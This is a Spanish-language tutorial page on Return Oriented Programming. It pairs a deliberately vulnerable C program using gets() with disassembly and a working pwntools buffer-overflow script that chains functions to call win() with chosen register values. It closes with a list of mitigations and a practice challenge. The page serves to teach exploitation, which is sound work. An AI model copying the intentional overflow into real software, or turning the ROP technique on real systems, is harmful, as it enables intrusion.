---
layout: default
title: Return Oriented Programming
grand_parent: Tipos de explotación
parent: Explotación orientada a control
nav_order: 3
---

# Return Oriented Programming (ROP)
{: .no_toc }

## Conocimientos necesarios
{: .no_toc .text-delta }

Antes de comenzar con esta sección, es recomendable que leas las siguientes
secciones de la guía si aún no las has leído:

[Stack](../../conceptos/stack.html){: .btn .btn-green }
[Calling Conventions](../../conceptos/calling_conventions.html){: .btn .btn-green }
[Procedure Linkage Table](../../conceptos/plt.html){: .btn .btn-green }
[Global Offset Table](../../conceptos/got.html){: .btn .btn-green }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Información General

Return oriented programming es una técnica que consiste en utilizar fragmentos
del código que existe en el binario (conocidos como gadgets) para crear
un nuevo comportamiento en el binario.

## Ejemplo

Observemos el siguiente código:

```c
#include <stdio.h>

void win(int a, int b, int c, int d) {
  if (a == 1 && b == 2 && c == 3 && d == 4) {
    puts("Ganaste");
  } else {
    puts("Los paramentros que usaste no son correctos");
  }
}

void set1(int a) {
}

void set2(int a, int b) {
}

void set3(int a, int b, int c) {
}

void set4(int a, int b, int c, int d) {
}

void chain1() {
  set4(4, 4, 4, 4);
}

void chain2() {
  set3(3, 3, 3);
}

void chain3() {
  set2(2, 2);
}

void chain4() {
  set1(1);
}

void vuln() {
  char input[8];

  puts("Ingresa tu input");
  gets(input);
}

int main() {
  vuln();

  return 0;
}
```

Nuestro objetivo es llamar a la función win con los argumentos correctos.
En este caso, el binario fue compilado para 64 bits, lo que significa que
no podemos pasarle los argumentos necesarios a la función win mediante el
stack.

Si recordamos los calling conventions para linux 64 bits, los argumentos
son pasados a través de los registros. Concretamente, necesitamos que el
primer argumento sea 1, el segundo 2, el tercero 3 y el cuarto 4, por
lo que debemos lograr que los registros queden de la siguiente forma:

- rdi = 1
- rsi = 2
- rdx = 3
- rcx = 4

Una vez que guardemos estos valores en los registros, podremos llamar a
la función win.

Veamos el ensamblador del binario para entender cómo establecer el valor
de nuestros registros, nos concentraremos en las funciones con nombre
"chain".

```
$ objdump -d rop -M intel
...

00000000004011c0 <chain1>:
  4011c0:       55                      push   rbp
  4011c1:       48 89 e5                mov    rbp,rsp
  4011c4:       b9 04 00 00 00          mov    ecx,0x4
  4011c9:       ba 04 00 00 00          mov    edx,0x4
  4011ce:       be 04 00 00 00          mov    esi,0x4
  4011d3:       bf 04 00 00 00          mov    edi,0x4
  4011d8:       e8 d0 ff ff ff          call   4011ad <set4>
  4011dd:       90                      nop
  4011de:       5d                      pop    rbp
  4011df:       c3                      ret

00000000004011e0 <chain2>:
  4011e0:       55                      push   rbp
  4011e1:       48 89 e5                mov    rbp,rsp
  4011e4:       ba 03 00 00 00          mov    edx,0x3
  4011e9:       be 03 00 00 00          mov    esi,0x3
  4011ee:       bf 03 00 00 00          mov    edi,0x3
  4011f3:       e8 a5 ff ff ff          call   40119d <set3>
  4011f8:       90                      nop
  4011f9:       5d                      pop    rbp
  4011fa:       c3                      ret

00000000004011fb <chain3>:
  4011fb:       55                      push   rbp
  4011fc:       48 89 e5                mov    rbp,rsp
  4011ff:       be 02 00 00 00          mov    esi,0x2
  401204:       bf 02 00 00 00          mov    edi,0x2
  401209:       e8 82 ff ff ff          call   401190 <set2>
  40120e:       90                      nop
  40120f:       5d                      pop    rbp
  401210:       c3                      ret

0000000000401211 <chain4>:
  401211:       55                      push   rbp
  401212:       48 89 e5                mov    rbp,rsp
  401215:       bf 01 00 00 00          mov    edi,0x1
  40121a:       e8 67 ff ff ff          call   401186 <set1>
  40121f:       90                      nop
  401220:       5d                      pop    rbp
  401221:       c3                      ret

  ...
  ```

Observamos que estas funciones pasan argumentos antes de llamar a las
funciones con nombre "set".

Observamos que:

- La función chain1 establece edi, esi, edx y ecx en 4
- La función chain2 establece edi, esi, edx en 3
- La función chain3 establece edi, esi en 2
- La función chain4 establece edi en 1

Por lo que si usamos el buffer overflow en el programa para llamar a estas
funciones en orden, nuestros registros obtendrían los valores que necesitamos.

```
chain1()

rdi = 4
rsi = 4
rdx = 4
rcx = 4

chain2()

rdi = 3
rsi = 3
rdx = 3
rcx = 4

chain3()

rdi = 2
rsi = 2
rdx = 3
rcx = 4

chain4()

rdi = 1
rsi = 2
rdx = 3
rcx = 4
```

Hagamos un script simple para comprobar que la idea funciona correctamente:

```python
from pwn import *

context.binary = vuln = ELF("./rop")

p = process(vuln.path)

payload = b""
payload += b"A" * (8 + 8)
payload += p64(vuln.symbols["chain1"])
payload += p64(vuln.symbols["chain2"])
payload += p64(vuln.symbols["chain3"])
payload += p64(vuln.symbols["chain4"])
payload += p64(vuln.symbols["win"])

p.sendline(payload)

p.interactive()
```

Veamos la salida del script:

```
$ python3 solve_rop.py
[*] '/tmp/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/tmp/rop': pid 9536
[*] Switching to interactive mode
Ingresa tu input
Ganaste
```

Observamos que imprime el mensaje "Ganaste", lo que significa que logramos
pasar los argumentos correctamente.

Este fue un ejemplo simplificado, en el que utilizamos funciones completas
que ya existían en el binario para lograr un nuevo comportamiento. En
escenarios más realistas, se suelen utilizar solo fragmentos de las funciones
existentes en el programa para lograr un nuevo comportamiento.

---

## Mitigaciones
Los siguientes mecanismos de seguridad dificultan o impiden el uso de esta
técnica:

[ASLR](../../mecanismos_seguridad/aslr.html){: .btn .btn-green }
[Canary](../../mecanismos_seguridad/canary.html){: .btn .btn-green }
[PIE](../../mecanismos_seguridad/pie.html){: .btn .btn-green }

## Retos

---

### rop1

Quizá sea una buena idea utilizar solo una parte de la función win para
conseguir lo que buscas.

Archivos:

[rop1](../../retos/rop/rop1.zip){: .btn .btn-blue }
